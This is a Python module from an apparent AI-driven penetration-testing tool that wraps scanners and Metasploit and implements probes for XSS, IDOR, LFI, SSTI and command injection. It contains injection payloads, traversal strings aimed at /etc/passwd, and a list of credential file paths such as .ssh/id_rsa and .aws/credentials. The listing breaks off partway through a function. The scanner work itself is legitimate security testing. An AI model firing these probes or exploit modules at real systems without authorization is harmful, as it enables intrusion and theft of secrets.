"""
Kryx Tool Integrations — wrappers around real pentesting tools
"""
import os
import json
import asyncio
import shutil
from pathlib import Path

from core.harness.auth_context import client as auth_client, sqlmap_args as _sqlmap_auth_args, auth_cookies, auth_headers

SANDBOX_DIR = Path(os.getenv("KRYX_SANDBOX_DIR") or os.getenv("HEXOR_SANDBOX_DIR", "/tmp/kryx-sandbox"))

# Optional API keys (from .env)
SHODAN_API_KEY = os.getenv("SHODAN_API_KEY")
CENSYS_API_ID = os.getenv("CENSYS_API_ID")
CENSYS_API_SECRET = os.getenv("CENSYS_API_SECRET")
MSFRPC_HOST = os.getenv("MSFRPC_HOST", "127.0.0.1")
MSFRPC_PORT = int(os.getenv("MSFRPC_PORT", "55553"))
MSFRPC_PASS = os.getenv("MSFRPC_PASS", "msfrpc")

# ── Tool registry ──────────────────────────────────────────

TOOLS_SCHEMA = [
    {
        "name": "nmap_scan",
        "description": "Full port scan with service/version detection and default scripts",
        "parameters": {"target": "string (host or IP)"},
    },
    {
        "name": "nuclei_scan",
        "description": "Template-based vulnerability scanner. Use for known CVE detection, misconfigurations, exposed panels",
        "parameters": {"target": "string (URL)"},
    },
    {
        "name": "subdomain_enum",
        "description": "Enumerate subdomains using crt.sh and DNS brute force",
        "parameters": {"domain": "string"},
    },
    {
        "name": "dir_bruteforce",
        "description": "Directory/file bruteforce using ffuf with common wordlist",
        "parameters": {"url": "string"},
    },
    {
        "name": "http_probe",
        "description": "Detailed HTTP probe: headers, security headers, cookies, tech stack fingerprint",
        "parameters": {"url": "string"},
    },
    {
        "name": "sensitive_files",
        "description": "Directly probe for commonly-exposed sensitive files (.env, .git/config, config.php, backups, db dumps, secrets). Use this for config/secret exposure — it catches files dir_bruteforce misses.",
        "parameters": {"url": "string"},
    },
    {
        "name": "xss_probe",
        "description": "Deterministically test reflected & stored XSS: injects a unique marker into URL query params and into page forms (POST), and reports whether it comes back UNescaped (real XSS) vs escaped (safe). Pass a URL with parameters and/or a form, e.g. /search?q=test or /guestbook.",
        "parameters": {"url": "string (URL with query parameters and/or a form)"},
    },
    {
        "name": "dom_xss_probe",
        "description": "Detect DOM-based XSS using a real headless browser (executes JS). Injects a payload into location.hash and query params; if it executes client-side it is confirmed. Use for SPAs / JS-heavy pages where xss_probe (no JS) can't see the sink.",
        "parameters": {"url": "string (URL, optionally with #hash or ?params)"},
    },
    {
        "name": "idor_probe",
        "description": "Test IDOR / BOLA (broken object-level authorization): given a URL with a numeric object id (e.g. /api/account?id=1 or /order/5), requests neighboring ids and reports if distinct per-object records are accessible without authorization. Top API vulnerability; scanners miss it.",
        "parameters": {"url": "string (URL containing a numeric object id)"},
    },
    {
        "name": "ssrf_probe",
        "description": "Test SSRF (server-side request forgery) out-of-band: passes a unique listener URL as each parameter and confirms the vuln if the target server connects back. Catches blind SSRF. Use on params that may take a URL/host (url=, dest=, img=, callback=, ...).",
        "parameters": {"url": "string (URL with query parameters)"},
    },
    {
        "name": "cmdi_probe",
        "description": "Test OS command injection (RCE): appends a shell command echoing a unique token via several separators (; | && backtick $()) to each parameter and confirms if the token executes server-side. Use on params that may reach a shell (host=, cmd=, ip=, file=, ...).",
        "parameters": {"url": "string (URL with query parameters)"},
    },
    {
        "name": "lfi_probe",
        "description": "Test path traversal / Local File Inclusion: injects ../ traversal sequences (various depths/encodings) to read sensitive files like /etc/passwd. Confirmed when the file's content is returned. Use on params taking a filename/path (file=, path=, page=, template=, ...).",
        "parameters": {"url": "string (URL with query parameters)"},
    },
    {
        "name": "ssti_probe",
        "description": "Test SSTI (server-side template injection): injects arithmetic in template syntaxes ({{a*b}}, ${a*b}, #{a*b}, <%= %>); if the product renders, the engine evaluated input => SSTI/RCE. Reflection-proof. Use on params reflected into pages (name=, msg=, q=, ...).",
        "parameters": {"url": "string (URL with query parameters)"},
    },
    {
        "name": "open_redirect_probe",
        "description": "Test open redirect: injects an external URL into redirect-like params (url=, next=, return=, ...) and confirms the server 3xx-redirects off-site.",
        "parameters": {"url": "string (URL with query parameters)"},
    },
    {
        "name": "cors_probe",
        "description": "Test CORS misconfiguration: sends an arbitrary Origin and flags if it's reflected in Access-Control-Allow-Origin (critical with Allow-Credentials).",
        "parameters": {"url": "string"},
    },
    {
        "name": "ssl_audit",
        "description": "SSL/TLS audit: certificate info, cipher suites, vulnerabilities",
        "parameters": {"host": "string"},
    },
    {
        "name": "sqlmap_check",
        "description": "Automated SQL injection detection and exploitation",
        "parameters": {"url": "string (full URL with parameters)"},
    },
    {
        "name": "whatweb",
        "description": "Web technology fingerprinting: CMS, frameworks, server, JS libraries",
        "parameters": {"url": "string"},
    },
    {
        "name": "cve_lookup",
        "description": "Search NVD for CVEs matching a software/version string",
        "parameters": {"keyword": "string"},
    },
    {
        "name": "dns_lookup",
        "description": "DNS record enumeration: A, AAAA, MX, NS, TXT, CNAME, SOA",
        "parameters": {"domain": "string"},
    },
    {
        "name": "whois_lookup",
        "description": "WHOIS domain registration information",
        "parameters": {"domain": "string"},
    },
    {
        "name": "shodan_lookup",
        "description": "Passive recon via Shodan: open ports, services, banners, CVEs for a host. No active scanning.",
        "parameters": {"target": "string (IP or hostname)"},
    },
    {
        "name": "censys_lookup",
        "description": "Passive recon via Censys: TLS certs, open ports, services for a host.",
        "parameters": {"target": "string (IP or hostname)"},
    },
    {
        "name": "msf_search",
        "description": "Search Metasploit modules for a CVE or keyword. Returns matching exploit/auxiliary modules.",
        "parameters": {"query": "string (CVE ID or keyword)"},
    },
    {
        "name": "msf_run",
        "description": "Run a Metasploit module against a target. Use only after confirming vulnerability exists.",
        "parameters": {"module": "string (e.g. exploit/multi/handler)", "options": "dict (RHOSTS, RPORT, etc.)"},
    },
    {
        "name": "browser_probe",
        "description": "Headless browser probe: renders JS, captures DOM, detects client-side vulns, screenshots. Use for SPAs and JS-heavy apps.",
        "parameters": {"url": "string", "actions": "list (optional: [{type: click|fill|navigate, selector, value}])"},
    },
]


async def run_tool(name: str, params: dict) -> dict:
    handlers = {
        "nmap_scan": _nmap_scan,
        "nuclei_scan": _nuclei_scan,
        "subdomain_enum": _subdomain_enum,
        "dir_bruteforce": _dir_bruteforce,
        "sensitive_files": _sensitive_files,
        "xss_probe": _xss_probe,
        "dom_xss_probe": _dom_xss_probe,
        "idor_probe": _idor_probe,
        "ssrf_probe": _ssrf_probe,
        "cmdi_probe": _cmdi_probe,
        "json_body_probe": _json_body_probe,
        "lfi_probe": _lfi_probe,
        "ssti_probe": _ssti_probe,
        "open_redirect_probe": _open_redirect_probe,
        "cors_probe": _cors_probe,
        "http_probe": _http_probe,
        "ssl_audit": _ssl_audit,
        "sqlmap_check": _sqlmap_check,
        "whatweb": _whatweb,
        "cve_lookup": _cve_lookup,
        "dns_lookup": _dns_lookup,
        "whois_lookup": _whois_lookup,
        "shodan_lookup": _shodan_lookup,
        "censys_lookup": _censys_lookup,
        "msf_search": _msf_search,
        "msf_run": _msf_run,
        "browser_probe": _browser_probe,
    }

    handler = handlers.get(name)
    if not handler:
        return {"error": f"Unknown tool: {name}"}

    try:
        return await handler(**params)
    except Exception as e:
        return {"error": str(e), "tool": name}


def _available(tool: str) -> bool:
    return shutil.which(tool) is not None


async def _run(cmd: list[str], timeout: int = 60) -> dict:
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return {
            "stdout": stdout.decode("utf-8", errors="replace")[:8000],
            "stderr": stderr.decode("utf-8", errors="replace")[:2000],
            "returncode": proc.returncode,
        }
    except asyncio.TimeoutError:
        proc.kill()
        return {"error": f"Timeout after {timeout}s", "stdout": "", "stderr": ""}


# ── Tool implementations ───────────────────────────────────

async def _nmap_scan(target: str) -> dict:
    if not _available("nmap"):
        return {"error": "nmap not installed. Run: sudo apt install nmap"}

    result = await _run([
        "nmap", "-sV", "-sC", "--top-ports", "1000",
        "-T4", "--open", target,
    ], timeout=120)

    # Parse open ports
    ports = []
    for line in result["stdout"].split("\n"):
        if "/tcp" in line and "open" in line:
            parts = line.split()
            ports.append({"port": parts[0], "state": parts[1], "service": " ".join(parts[2:])})

    return {
        "target": target,
        "open_ports": ports,
        "raw": result["stdout"][:4000],
    }


async def _nuclei_scan(target: str) -> dict:
    if not _available("nuclei"):
        return {"error": "nuclei not installed. Run: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"}

    result = await _run([
        "nuclei", "-u", target,
        "-severity", "critical,high,medium",
        "-silent", "-no-color",
    ], timeout=120)

    findings = []
    for line in result["stdout"].strip().split("\n"):
        if line.strip():
            findings.append(line.strip())

    return {
        "target": target,
        "findings": findings,
        "count": len(findings),
    }


async def _subdomain_enum(domain: str) -> dict:
    results = {"subdomains": [], "method": []}

    # crt.sh (no tool needed)
    import ssl as _ssl
    import socket as _socket
    try:
        ctx = _ssl.create_default_context()
        with ctx.wrap_socket(_socket.socket(), server_hostname="crt.sh") as s:
            s.settimeout(10)
            s.connect(("crt.sh", 443))
            request = f"GET /?q=%25.{domain}&output=json HTTP/1.1\r\nHost: crt.sh\r\nConnection: close\r\n\r\n"
            s.send(request.encode())
            response = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
            body = response.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in response else b""
            data = json.loads(body.decode())
            names = set()
            for entry in data:
                name = entry.get("name_value", "")
                for n in name.split("\n"):
                    n = n.strip().lower()
                    if n.endswith(f".{domain}") or n == domain:
                        names.add(n)
            results["subdomains"].extend(sorted(names))
            results["method"].append("crt.sh")
    except Exception:
        pass

    # Try subfinder if available
    if _available("subfinder"):
        r = await _run(["subfinder", "-d", domain, "-silent"], timeout=60)
        for line in r["stdout"].strip().split("\n"):
            if line.strip():
                results["subdomains"].append(line.strip().lower())
        results["method"].append("subfinder")

    results["subdomains"] = sorted(set(results["subdomains"]))
    return results


async def _dir_bruteforce(url: str) -> dict:
    if not _available("ffuf"):
        return {"error": "ffuf not installed. Run: go install github.com/ffuf/ffuf/v2@latest"}

    # Use built-in small wordlist
    wordlist = "/usr/share/wordlists/dirb/common.txt"
    if not os.path.exists(wordlist):
        wordlist = "/usr/share/dirb/wordlists/common.txt"

    if not os.path.exists(wordlist):
        return {"error": f"No wordlist found. Create {wordlist}"}

    result = await _run([
        "ffuf", "-u", f"{url.rstrip('/')}/FUZZ",
        "-w", wordlist,
        "-mc", "200,204,301,302,307,401,403,405",
        "-s", "-of", "json",
    ], timeout=90)

    findings = []
    for line in result["stdout"].strip().split("\n"):
        if line.strip():
            try:
                entry = json.loads(line)
                findings.append({
                    "path": entry.get("url", ""),
                    "status": entry.get("status", 0),
                    "size": entry.get("content_length", 0),
                })
            except json.JSONDecodeError:
                pass

    return {"url": url, "found": findings[:50], "count": len(findings)}


SENSITIVE_PATHS = [
    "/.env", "/.env.local", "/.env.backup", "/.env.bak",
    "/.git/config", "/.git/HEAD", "/.svn/entries", "/.hg/hgrc",
    "/config.php", "/config.php.bak", "/config.json", "/settings.py",
    "/wp-config.php", "/wp-config.php.bak", "/.aws/credentials",
    "/.ssh/id_rsa", "/backup.zip", "/backup.tar.gz", "/backup.sql",
    "/db.sql", "/dump.sql", "/database.sql", "/.DS_Store",
    "/phpinfo.php", "/info.php", "/server-status", "/.htpasswd",
    "/composer.json", "/package.json", "/.npmrc", "/docker-compose.yml",
    "/credentials.json", "/secrets.json", "/.dockerenv",
]


async def _sensitive_files(url: str) -> dict:
    """Directly probe a curated list of commonly-exposed sensitive files
    (config, VCS metadata, backups, secrets). Catches files generic
    wordlist bruteforce misses, e.g. /.env."""
    import httpx
    base = url.rstrip("/")
    if not base.startswith("http"):
        base = f"http://{base}"

    async with auth_client(timeout=8, follow_redirects=False, verify=False) as client:
        async def check(path):
            try:
                r = await client.get(base + path)
                if r.status_code == 200 and r.content:
                    head = r.text[:200].lower()
                    looks_html = "<html" in head or "<!doctype" in head
                    return {
                        "path": path,
                        "status": 200,
                        "size": len(r.content),
                        "preview": r.text[:300],
                        "likely_real": not looks_html,  # HTML 200 is often a catch-all
                    }
            except Exception:
                return None
            return None

        results = await asyncio.gather(*[check(p) for p in SENSITIVE_PATHS])

    exposed = [r for r in results if r]
    return {
        "url": base,
        "exposed_files": exposed,
        "count": len(exposed),
        "checked": len(SENSITIVE_PATHS),
    }


async def _http_probe(url: str) -> dict:
    import httpx

    if not url.startswith("http"):
        urls = [f"https://{url}", f"http://{url}"]
    else:
        urls = [url]

    last_err = None
    for u in urls:
        try:
            async with auth_client(timeout=10, follow_redirects=True, verify=False) as client:
                r = await client.get(u)
                headers = dict(r.headers)

                security_headers = {
                    "strict-transport-security": headers.get("strict-transport-security"),
                    "content-security-policy": headers.get("content-security-policy"),
                    "x-frame-options": headers.get("x-frame-options"),
                    "x-content-type-options": headers.get("x-content-type-options"),
                    "referrer-policy": headers.get("referrer-policy"),
                    "permissions-policy": headers.get("permissions-policy"),
                }

                missing = [k for k, v in security_headers.items() if not v]

                # Parse the body so hunters can SEE the app: links, forms,
                # parameters and reflected content. Without this the agents are
                # blind to endpoints like /user?id= or /search?q=.
                import re as _re
                body = r.text or ""
                links = sorted({l for l in _re.findall(
                    r'(?:href|src|action)=["\']([^"\'#> ]+)', body) if l})[:40]
                params = sorted(set(
                    _re.findall(r'[?&]([A-Za-z0-9_\[\]]+)=', body)
                    + _re.findall(r'<input[^>]+name=["\']([^"\']+)', body, _re.I)
                ))[:30]
                forms = _re.findall(r'<form[^>]*>', body, _re.I)[:10]

                return {
                    "url": u,
                    "status": r.status_code,
                    "server": headers.get("server", "unknown"),
                    "x_powered_by": headers.get("x-powered-by"),
                    "security_headers": security_headers,
                    "missing_headers": missing,
                    "cookies": [
                        {"name": c, "httponly": "httponly" in str(v).lower(),
                         "secure": "secure" in str(v).lower()}
                        for c, v in r.cookies.items()
                    ],
                    "headers_count": len(headers),
                    "body_preview": body[:1500],
                    "links": links,
                    "params_seen": params,
                    "forms": forms,
                    "content_type": headers.get("content-type"),
                }
        except Exception as e:
            last_err = f"{type(e).__name__}: {e}".strip()
            continue

    return {"error": f"Could not connect to {url}", "reason": last_err or "unknown",
            "tried": urls, "hint": "Target unreachable from scanner host (firewall/DNS/down) — not necessarily a vuln."}


async def _xss_probe(url: str) -> dict:
    """Test XSS deterministically by injecting a unique marker and checking if
    it comes back UNescaped (real XSS) vs escaped (safe). Covers:
      - reflected (GET): each query parameter
      - reflected/stored (POST): forms on the page — submit, then re-fetch and
        see if the marker persists unescaped (stored) or reflects (reflected)
    DOM XSS needs browser_probe. Pass a URL (with params and/or a form)."""
    import httpx
    import secrets
    import re
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

    if not url.startswith("http"):
        url = f"http://{url}"

    def _mark():
        return "kx" + secrets.token_hex(3)

    def _ctx(body, needle):
        i = body.find(needle)
        return body[max(0, i - 40): i + 90] if i >= 0 else ""

    def _is_html(resp):
        # Reflection is only exploitable XSS if the browser renders it as HTML.
        # JSON/text/etc. responses are NOT executed -> not XSS.
        ct = resp.headers.get("content-type", "").lower()
        return ("html" in ct) or (not ct)

    PAYLOAD_TAIL = "<svg/onload=alert(1)>"
    findings = []

    async with auth_client(timeout=8, follow_redirects=True, verify=False) as client:
        # 1) Reflected XSS via GET query parameters.
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        for pname in params:
            m = _mark()
            tp = {k: v[0] for k, v in params.items()}
            tp[pname] = m + PAYLOAD_TAIL
            turl = urlunparse(parsed._replace(query=urlencode(tp)))
            try:
                r = await client.get(turl)
                if m + PAYLOAD_TAIL in r.text and _is_html(r):
                    findings.append({"type": "reflected", "vector": f"GET param '{pname}'",
                                     "context": _ctx(r.text, m)})
            except Exception:
                pass

        # 2) Forms on the page -> reflected (POST echo) or stored (persists).
        try:
            page = (await client.get(url)).text
        except Exception:
            page = ""
        for fm in re.findall(r"<form[^>]*>.*?</form>", page, re.I | re.S):
            am = re.search(r'action=["\']([^"\']*)', fm, re.I)
            mm = re.search(r'method=["\']([^"\']*)', fm, re.I)
            action = am.group(1) if am else ""
            method = (mm.group(1).lower() if mm else "get")
            inputs = re.findall(r'<(?:input|textarea)[^>]+name=["\']([^"\']+)', fm, re.I)
            if not inputs:
                continue
            target = urljoin(url, action) if action else url
            m = _mark()
            data = {n: m + PAYLOAD_TAIL for n in inputs}
            try:
                if method == "post":
                    await client.post(target, data=data)
                    # stored: re-fetch the form page and the action page
                    for check in {url, target}:
                        rb = await client.get(check)
                        if m + PAYLOAD_TAIL in rb.text and _is_html(rb):
                            findings.append({"type": "stored",
                                             "vector": f"POST {inputs} -> reflected on {check}",
                                             "context": _ctx(rb.text, m)})
                            break
                else:
                    rf = await client.get(target, params=data)
                    if m + PAYLOAD_TAIL in rf.text and _is_html(rf):
                        findings.append({"type": "reflected", "vector": f"GET form {inputs}",
                                         "context": _ctx(rf.text, m)})
            except Exception:
                pass

    return {
        "url": url,
        "vulnerable": len(findings) > 0,
        "findings": findings,
        "note": "Tested GET params + forms (reflected & stored). DOM XSS requires browser_probe.",
    }


async def _idor_probe(url: str) -> dict:
    """Test IDOR / BOLA (broken object-level authorization). Find a numeric
    object id in the URL, request neighboring ids, and check whether distinct
    per-object records come back. A page that differs only by the id number is
    NOT flagged; only genuinely different records (different owner/data) count.
    Full proof needs two identities — anonymous access to distinct records is a
    strong IDOR signal when the endpoint should be access-controlled."""
    import re
    import httpx
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    from difflib import SequenceMatcher

    # STRONG markers of private/per-user data (real IDOR). Deliberately strict —
    # incidental words (an email or "private"/"credit" in public product copy)
    # must NOT trigger. Require an actual secret/credential token or a private
    # JSON field, which public pages don't carry.
    SENS = re.compile(
        r"\b(secret|passwd|password|api[_-]?key|access[_-]?token|auth[_-]?token|"
        r"private[_-]?token|session[_-]?token|ssn|iban|cvv|routing[_-]?number|"
        r"social[_-]?security)\b"
        r"|\"(token|balance|card_number|credit_card|cvv|password|api_key|"
        r"private_token|access_token)\"\s*:", re.I)

    if not url.startswith("http"):
        url = f"http://{url}"
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    # Locate a numeric object id: query param first, else last path segment.
    id_param, base_id, seg_idx = None, None, None
    for k, v in qs.items():
        if v and v[0].lstrip("-").isdigit():
            id_param, base_id = k, int(v[0])
            break
    if base_id is None:
        segs = parsed.path.split("/")
        for i in range(len(segs) - 1, -1, -1):
            if segs[i].isdigit():
                seg_idx, base_id = i, int(segs[i])
                break
    if base_id is None:
        return {"url": url, "vulnerable": False,
                "note": "No numeric object id in URL. Use e.g. /api/account?id=1 or /order/5"}

    def build(new_id):
        if id_param is not None:
            tp = {k: v[0] for k, v in qs.items()}
            tp[id_param] = str(new_id)
            return urlunparse(parsed._replace(query=urlencode(tp)))
        segs = parsed.path.split("/")
        segs[seg_idx] = str(new_id)
        return urlunparse(parsed._replace(path="/".join(segs)))

    async with auth_client(timeout=8, follow_redirects=True, verify=False) as client:
        async def fetch(i):
            try:
                r = await client.get(build(i))
                return {"id": i, "status": r.status_code, "body": r.text}
            except Exception:
                return {"id": i, "status": 0, "body": ""}

        base = await fetch(base_id)
        others = [await fetch(i) for i in (base_id - 2, base_id - 1, base_id + 1, base_id + 2, base_id + 3)
                  if i != base_id and i >= 0]

    accessible = []
    for o in others:
        if o["status"] == 200 and o["body"]:
            ratio = SequenceMatcher(None, base.get("body", ""), o["body"]).ratio()
            if ratio < 0.95:  # genuinely different record, not just a reflected id
                accessible.append({"id": o["id"], "diff_ratio": round(ratio, 2),
                                   "preview": o["body"][:140],
                                   "sensitive": bool(SENS.search(o["body"]))})

    distinct = len(accessible) >= 2
    # Only a real IDOR if the other records expose PRIVATE data. Distinct public
    # records (products, blog posts) are not IDOR — that's the FP we kill here.
    sensitive = any(a["sensitive"] for a in accessible)
    vulnerable = distinct and sensitive

    if distinct and not sensitive:
        note = ("Distinct records enumerable, but no sensitive/PII data found — "
                "likely a PUBLIC resource (catalog/blog), NOT IDOR.")
    else:
        note = ("Other users' private data returned without authorization => "
                "IDOR/BOLA. Full proof needs two identities.")

    return {
        "url": url,
        "vulnerable": vulnerable,
        "id_param": id_param or (f"path segment #{seg_idx}" if seg_idx is not None else None),
        "base_id": base_id,
        "other_records_accessible": accessible,
        "sensitive_data": sensitive,
        "confidence": "high" if vulnerable else "low",
        "note": note,
    }


async def _dom_xss_probe(url: str) -> dict:
    """Detect DOM-based XSS with a headless browser. The payload never reaches
    the server — it executes client-side. We inject a payload that, if it runs,
    sets a unique window flag; then we read the flag back. Flag set => our input
    executed as JS (real DOM XSS). Covers location.hash and query-param sinks
    (innerHTML, document.write, eval, ...)."""
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return {"error": "playwright not installed. Run: playwright install chromium"}
    import secrets
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

    if not url.startswith("http"):
        url = f"http://{url}"

    token = "kx" + secrets.token_hex(4)
    # <img onerror> fires even when inserted via innerHTML (where <script> won't).
    payload = f"<img src=x onerror=\"window.__kx='{token}'\">"
    parsed = urlparse(url)

    candidates = [
        ("hash:name=", urlunparse(parsed._replace(fragment="name=" + quote(payload, safe="")))),
        ("hash:raw", urlunparse(parsed._replace(fragment=quote(payload, safe="")))),
    ]
    qs = parse_qs(parsed.query, keep_blank_values=True)
    for p in qs:
        tp = {k: v[0] for k, v in qs.items()}
        tp[p] = payload
        candidates.append((f"query:{p}", urlunparse(parsed._replace(query=urlencode(tp)))))

    findings = []
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True, args=["--no-sandbox"])
        # carry auth (session cookies + headers) into the browser for authed DOM XSS
        _origin = f"{parsed.scheme}://{parsed.netloc}"
        bctx = await browser.new_context(extra_http_headers=auth_headers() or None)
        _ck = [{"name": k, "value": v, "url": _origin} for k, v in auth_cookies().items()]
        if _ck:
            await bctx.add_cookies(_ck)
        try:
            for vector, turl in candidates:
                page = await bctx.new_page()
                try:
                    await page.goto(turl, wait_until="load", timeout=15000)
                    await page.wait_for_timeout(400)  # let onerror fire
                    flag = await page.evaluate("window.__kx || ''")
                    if flag == token:
                        findings.append({"type": "dom", "vector": vector,
                                         "url": turl, "payload": payload})
                except Exception:
                    pass
                finally:
                    await page.close()
                if findings:
                    break
        finally:
            await browser.close()

    return {
        "url": url,
        "vulnerable": len(findings) > 0,
        "findings": findings,
        "note": "DOM XSS via headless browser — payload executed and set a window flag.",
    }


async def _lfi_probe(url: str) -> dict:
    """Test path traversal / LFI: inject traversal sequences (several depths and
    encodings) targeting a known sensitive file (/etc/passwd, Windows win.ini).
    Confirmed when the file's signature appears in the response."""
    import httpx
    import re
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    if not url.startswith("http"):
        url = f"http://{url}"
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        return {"url": url, "vulnerable": False, "note": "No query parameters to test."}

    trav = "../" * 8
    payloads = [
        trav + "etc/passwd", "/etc/passwd",
        ("..%2f" * 8) + "etc%2fpasswd",
        ("....//" * 8) + "etc/passwd",
        trav + "windows/win.ini", "/windows/win.ini",
    ]
    sigs = [re.compile(r"root:.*?:0:0:"), re.compile(r"\[(fonts|extensions)\]", re.I)]
    kw = ("file", "path", "page", "doc", "template", "include", "load", "dir",
          "download", "view", "name", "img", "read", "filename")

    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as client:
        params = sorted(qs, key=lambda k: 0 if any(w in k.lower() for w in kw) else 1)
        for pname in params:
            hit = False
            for pl in payloads:
                tp = {k: v[0] for k, v in qs.items()}
                tp[pname] = pl
                turl = urlunparse(parsed._replace(query=urlencode(tp, safe="%/.")))
                try:
                    body = (await client.get(turl)).text
                    if any(s.search(body) for s in sigs):
                        findings.append({"param": pname, "payload": pl,
                                         "proof": "sensitive file content (e.g. /etc/passwd) returned"})
                        hit = True
                        break
                except Exception:
                    pass
            if hit:
                break

    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "tested_params": list(qs.keys()),
            "note": "Path traversal / LFI: server returned a sensitive file's contents."}


async def _ssti_probe(url: str) -> dict:
    """Test SSTI (server-side template injection) via arithmetic across template
    syntaxes ({{ }}, ${ }, #{ }, <%= %>). If the PRODUCT of two random numbers
    renders in the response, the template engine evaluated our input => SSTI,
    often RCE. Reflection-proof (echo shows the expression, not the product)."""
    import httpx
    import random
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    if not url.startswith("http"):
        url = f"http://{url}"
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        return {"url": url, "vulnerable": False, "note": "No query parameters to test."}

    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as client:
        try:
            baseline = (await client.get(url)).text
        except Exception:
            baseline = ""
        for pname in qs:
            a, b = random.randint(100000, 999999), random.randint(11, 97)
            product = str(a * b)
            tmpls = [
                f"{{{{{a}*{b}}}}}",      # {{a*b}} Jinja2/Twig
                f"${{{a}*{b}}}",         # ${a*b}  JSP/Spring EL
                f"#{{{a}*{b}}}",         # #{a*b}  Ruby/Thymeleaf
                f"<%= {a}*{b} %>",       # ERB
                f"{{{a}*{b}}}",          # {a*b}
            ]
            for pl in tmpls:
                tp = {k: v[0] for k, v in qs.items()}
                tp[pname] = pl
                turl = urlunparse(parsed._replace(query=urlencode(tp)))
                try:
                    body = (await client.get(turl)).text
                    if product in body and product not in baseline:
                        findings.append({"param": pname, "payload": pl,
                                         "proof": f"template engine evaluated {a}*{b}={product}"})
                        break
                except Exception:
                    pass

    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "tested_params": list(qs.keys()),
            "note": "SSTI confirmed via server-side template arithmetic. Often escalates to RCE."}


async def _cmdi_probe(url: str) -> dict:
    """Test OS command injection (in-band) via ARITHMETIC evaluation. Append a
    shell command that multiplies two random numbers, through several separators
    (; | && `` $()). If the PRODUCT appears in the response, the shell evaluated
    our expression => RCE-class command injection. This beats reflection false
    positives: echoing input back shows the expression text, never the computed
    product. Blind cmdi would need OOB/time-based."""
    import httpx
    import random
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    if not url.startswith("http"):
        url = f"http://{url}"
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        return {"url": url, "vulnerable": False, "note": "No query parameters to test."}

    findings = []
    async with auth_client(timeout=10, follow_redirects=True, verify=False) as client:
        try:
            baseline = (await client.get(url)).text
        except Exception:
            baseline = ""

        for pname in qs:
            orig = qs[pname][0]
            a, b = random.randint(100000, 999999), random.randint(11, 97)
            product = str(a * b)  # 7-8 digits; reflection can't produce this
            payloads = [
                f";echo $(({a}*{b}))", f"|echo $(({a}*{b}))", f"&&echo $(({a}*{b}))",
                f"$(({a}*{b}))", f"$(expr {a} \\* {b})", f"`expr {a} \\* {b}`",
                f";expr {a} \\* {b}", f"\necho $(({a}*{b}))",
            ]
            for inj in payloads:
                tp = {k: v[0] for k, v in qs.items()}
                tp[pname] = orig + inj
                turl = urlunparse(parsed._replace(query=urlencode(tp)))
                try:
                    body = (await client.get(turl)).text
                    if product in body and product not in baseline:
                        findings.append({"param": pname, "payload": inj,
                                         "proof": f"shell evaluated {a}*{b}={product} server-side"})
                        break
                except Exception:
                    pass

    return {
        "url": url,
        "vulnerable": len(findings) > 0,
        "findings": findings,
        "tested_params": list(qs.keys()),
        "note": "In-band OS command injection confirmed via server-side arithmetic. RCE-class.",
    }


async def _json_body_probe(url: str, body: dict, method: str = "POST") -> dict:
    """Test a JSON REQUEST BODY for injection in each field. Modern APIs take
    JSON in POST/PUT bodies, which the GET-param detectors never reach. For each
    string/number field (flat or nested) we inject, one field at a time:
      - cmdi arithmetic  (;echo $((a*b)))  -> product in response => RCE-class
      - ssti arithmetic  ({{a*b}})         -> product => SSTI/RCE
      - error-based SQLi (')               -> SQL error signature => SQLi
      - XSS marker (flagged ONLY if reflected unescaped AND HTML content-type)
    All proof-by-execution / signature — reflection-safe like the GET probes."""
    import random
    import secrets
    import copy

    if not url.startswith("http"):
        url = f"http://{url}"
    method = (method or "POST").upper()
    if not isinstance(body, dict) or not body:
        return {"url": url, "vulnerable": False, "note": "No JSON body fields to test."}

    SQL_ERRS = ("sql syntax", "you have an error in your sql", "mysql_fetch",
                "ora-0", "unclosed quotation", "quoted string not properly terminated",
                "psql:", "sqlite3.", "syntax error at or near", "pg_query",
                "sqlstate", "warning: mysqli", "unterminated quoted string")

    # Collect paths to string/number leaves (flat + nested dicts/lists).
    paths: list[list] = []
    def _walk(node, path):
        if isinstance(node, dict):
            for k, v in node.items():
                _walk(v, path + [k])
        elif isinstance(node, list):
            for i, v in enumerate(node):
                _walk(v, path + [i])
        elif isinstance(node, (str, int, float)) and not isinstance(node, bool):
            paths.append(path)
    _walk(body, [])

    def _set(obj, path, val):
        o = copy.deepcopy(obj)
        ref = o
        for p in path[:-1]:
            ref = ref[p]
        ref[path[-1]] = val
        return o

    def _get(obj, path):
        ref = obj
        for p in path:
            ref = ref[p]
        return ref

    def _is_html(resp):
        ct = resp.headers.get("content-type", "").lower()
        return ("html" in ct) or (not ct)

    findings = []
    async with auth_client(timeout=10, follow_redirects=True, verify=False) as client:
        async def send(payload_body):
            return await client.request(method, url, json=payload_body)

        try:
            baseline = (await send(body)).text
        except Exception:
            baseline = ""
        base_low = baseline.lower()

        for path in paths[:25]:  # bound work on huge payloads
            label = ".".join(str(p) for p in path)
            orig = _get(body, path)
            sorig = str(orig) if orig is not None else ""
            a, b = random.randint(100000, 999999), random.randint(11, 97)
            product = str(a * b)
